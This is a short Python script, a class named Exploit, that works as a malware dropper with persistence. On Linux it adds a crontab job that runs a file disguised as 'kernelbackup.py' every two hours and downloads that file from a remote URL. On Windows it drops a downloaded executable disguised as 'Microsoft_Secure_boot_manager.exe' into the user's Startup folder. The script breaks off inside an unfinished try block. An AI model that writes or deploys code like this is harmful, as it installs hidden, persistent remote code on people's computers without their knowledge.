from sys import platform as _platform
from sys import exit as exit
from requests import get as load
from crontab import CronTab
import os
import getpass

class Exploit:
    system = None
    username= "max"

    def __init__(self):
        
        self.system=_platform
        self.username= getpass.getuser()
        if _platform == "darwin":
            exit()        

    def addtoSystemstart(self):
        if self.system=="linux":
            cron = CronTab(user=self.username)
            target = f"/home/{self.username}/kernelbackup.py"
            basic_command = f"* */2 * * * python3 /home/{self.username}/kernelbackup.py"
            cronIter= cron.find_command(f"python3 {target}")
            exsist=False
            for item in cronIter:
                if str(item) == basic_command:
                    print("crontab job already exist", item)
                    exsist=True
                    break

            if not exsist:                
                job = cron.new(f"python3 /home/{self.username}/kernelbackup.py")
                job.hour.every(2)
                job.enable()
                cron.write()
            if not os.path.isfile(target):
                data= load("https://example.example/test/startup.py")
                open(target, 'wb').write(data.content)


        elif self.system=="win32" or self.system=="win64":
            target = f"C:/Users/{self.username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Microsoft_Secure_boot_manager.exe"
            if not os.path.isfile(target):
                data= load("https://example.example/test/startup.exe", stream=True)
                open(target, 'wb').write(data.content)
        else:
            pass
     

if __name__ == "__main__":
    try:
    	hack = Exploit()
    	hack.addtoSystemstart()